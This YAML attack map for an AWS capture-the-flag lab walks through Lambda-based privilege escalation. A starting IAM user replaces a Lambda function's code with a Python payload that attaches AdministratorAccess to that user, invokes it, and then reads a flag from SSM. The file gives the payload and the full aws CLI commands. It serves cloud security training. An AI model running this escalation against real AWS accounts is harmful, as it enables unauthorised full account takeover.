attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-lambda-003-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has lambda:UpdateFunctionCode and lambda:InvokeFunction permissions
        on a pre-existing Lambda function whose execution role has AdministratorAccess.

    - id: target-lambda
      label: "Target Lambda"
      type: resource
      subType: lambda-function
      arn: "arn:aws:lambda:{region}:{account_id}:function/pl-prod-lambda-003-to-admin-target-lambda"
      description: >
        This Lambda function currently runs benign code. Its execution role has
        AdministratorAccess. By replacing the function code with a malicious payload
        and invoking it, you can leverage the execution role to escalate your own privileges.

    - id: target-admin
      label: "Admin Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-lambda-003-to-admin-target-role"
      description: >
        This Lambda execution role has AdministratorAccess. When the malicious payload
        executes under this role, it calls iam:AttachUserPolicy to grant the starting
        user AdministratorAccess, achieving full administrative access to the AWS account.
        With admin-equivalent permissions now held by the starting user, they can read
        the scenario's CTF flag from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/lambda-003-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-principal
      to: target-lambda
      label: "lambda:UpdateFunctionCode"
      description: >
        Replace the Lambda function's existing code with a malicious payload that
        calls iam:AttachUserPolicy to grant the starting user AdministratorAccess.
      hints:
        - "Fetch the existing function config with lambda:GetFunction to confirm the Handler field, then append your AttachUserPolicy call to the handler. The handler filename must match the existing Handler field exactly or the invocation will fail."
        - "Package as a zip and deploy with lambda:UpdateFunctionCode using the fileb:// prefix, then invoke with lambda:InvokeFunction. Lambda returns HTTP 200 even when the handler throws an exception -- always check the response body for errors. After a successful invocation, wait ~15 seconds for IAM policy propagation before verifying with iam:ListAttachedUserPolicies."
        - "Browse to https://pathfinding.cloud/paths/lambda-003 for technique details."
      commands:
        - description: "Create malicious Lambda function code"
          command: |
            cat > /tmp/lambda_function.py << 'EOF'
            import boto3
            import json

            def lambda_handler(event, context):
                iam = boto3.client('iam')
                iam.attach_user_policy(
                    UserName='pl-prod-lambda-003-to-admin-starting-user',
                    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
                )
                return {'statusCode': 200, 'body': json.dumps('Privilege escalation successful')}
            EOF
        - description: "Package and deploy the malicious code"
          command: "cd /tmp && zip lambda_function.zip lambda_function.py && aws lambda update-function-code --function-name pl-prod-lambda-003-to-admin-target-lambda --zip-file fileb:///tmp/lambda_function.zip"

    - from: target-lambda
      to: target-admin
      label: "lambda:InvokeFunction + iam:AttachUserPolicy"
      description: >
        Invoke the Lambda function with a payload specifying the target username.
        The function executes under its privileged execution role and attaches
        AdministratorAccess to the starting user.
      hints: []
      commands:
        - description: "Invoke the malicious Lambda function"
          command: "aws lambda invoke --function-name pl-prod-lambda-003-to-admin-target-lambda --payload '{}' /tmp/response.json && cat /tmp/response.json"
        - description: "Verify administrator access"
          command: "aws iam list-attached-user-policies --user-name pl-prod-lambda-003-to-admin-starting-user"

    - from: target-admin
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access you just gained.
      hints:
        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/lambda-003-to-admin --query 'Parameter.Value' --output text"
